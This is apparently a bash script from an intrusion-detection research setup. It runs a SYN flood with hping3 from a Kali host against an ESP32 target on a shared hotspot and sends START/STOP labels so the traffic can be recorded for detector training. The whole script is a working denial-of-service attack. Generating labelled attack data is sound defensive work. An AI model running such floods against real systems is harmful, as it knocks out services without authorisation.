#!/usr/bin/env bash
# SYN flood + labeling (Kali managed Wi-Fi on the same hotspot).
# Usage: sudo -E ./host/attacks/syn_flood.sh
set -euo pipefail
DIR="$(cd "$(dirname "$0")" && pwd)"
# shellcheck source=netconfig.sh
source "${DIR}/netconfig.sh"

TARGET_IP="$(get_esp32_ip)"
TARGET_PORT="${NIDS_TARGET_PORT:-80}"

if ip link show "${MON_IFACE}" >/dev/null 2>&1; then
  echo ">>> WARN: ${MON_IFACE} still up. SYN needs managed Wi-Fi."
  echo ">>> Run: sudo -E ./host/attacks/prepare_wifi.sh managed"
  echo ">>> then join SSID '${SSID}' before re-running."
  exit 1
fi

echo ">>> Target ESP32 IP : ${TARGET_IP}:${TARGET_PORT}"
echo ">>> Out interface   : $WIFI_IFACE"
echo ">>> Label host      : $(get_label_host):${LABEL_PORT}"
ensure_label_path || exit 1
ensure_wifi_associated "$WIFI_IFACE" "$SSID" || exit 1
# Catch "ping works but via NAT/Windows" (ttl~128) after failed hotspot join
if ! ping -c 1 -W 2 "$TARGET_IP" >/dev/null 2>&1; then
  echo ">>> ERROR: cannot ping ${TARGET_IP} on ${WIFI_IFACE} — rejoin '${SSID}'" >&2
  exit 1
fi
echo ">>> READY FOR SYN FLOOD"

send_label START SYN_FLOOD
sleep 1

batch_count=5000
repeats=10
for ((i=1; i<=repeats; i++)); do
  echo ">>> Batch ${i}/${repeats}: flooding ${batch_count} SYN packets"
  timeout 10 hping3 -S -p "$TARGET_PORT" -c "$batch_count" --flood \
    -I "$WIFI_IFACE" "$TARGET_IP" >/dev/null 2>&1 || true
  sleep 2
done

sleep 1
send_label STOP SYN_FLOOD
echo " >>> ATTACK FINISHED"
